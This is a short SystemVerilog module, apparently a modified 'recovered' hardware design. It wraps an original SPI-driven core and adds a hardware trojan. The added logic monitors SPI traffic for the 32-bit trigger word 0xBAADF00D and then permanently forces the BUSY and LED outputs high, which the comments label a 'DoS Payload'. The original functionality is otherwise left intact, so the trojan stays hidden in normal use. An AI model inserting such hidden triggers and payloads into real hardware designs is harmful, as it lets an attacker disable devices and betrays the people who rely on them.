module recovered (
    input  logic pin_36, // SCK
    input  logic pin_25, // ENC_DEC
    input  logic pin_28, // NORM_CS_N
    input  logic pin_32, // MOSI
    input  logic pin_34, // RST_N
    input  logic pin_27, // START
    output logic pin_38, // BUSY
    output logic pin_23, // ICE_LED
    output logic pin_31  // MISO
);

    logic orig_busy;
    logic orig_ice_led;

    // Instantiate the original module, preserving its internal functionality
    recovered_original recovered_original_inst (
        .pin_36(pin_36),
        .pin_25(pin_25),
        .pin_28(pin_28),
        .pin_32(pin_32),
        .pin_34(pin_34),
        .pin_27(pin_27),
        .pin_38(orig_busy),
        .pin_23(orig_ice_led),
        .pin_31(pin_31)
    );

    logic [31:0] shift_reg;
    logic [5:0]  bit_cnt;
    logic        trigger;

    // Fully synchronous SPI monitoring logic
    // Reliably initialized by active-low synchronous reset and SPI transaction boundaries
    always_ff @(posedge pin_36) begin
        if (!pin_34) begin
            bit_cnt   <= 6'd0;
            shift_reg <= 32'd0;
            trigger   <= 1'b0;
        end else begin
            if (pin_28) begin
                // Synchronous reset on transaction boundary (CS high)
                // Prevents interrupted transactions from accidentally triggering the payload
                bit_cnt   <= 6'd0;
                shift_reg <= 32'd0;
            end else begin
                bit_cnt   <= bit_cnt + 6'd1;
                shift_reg <= {shift_reg[30:0], pin_32};
                
                // Trigger detection: exactly 32 bits received during an active CS phase
                if ((bit_cnt == 6'd31) && ({shift_reg[30:0], pin_32} == 32'hBAADF00D)) begin
                    trigger <= 1'b1;
                end
            end
        end
    end

    // DoS Payload: Latch BUSY high externally and keep ICE_LED consistent during the triggered state
    assign pin_38 = orig_busy | trigger;
    assign pin_23 = orig_ice_led | trigger;

endmodule
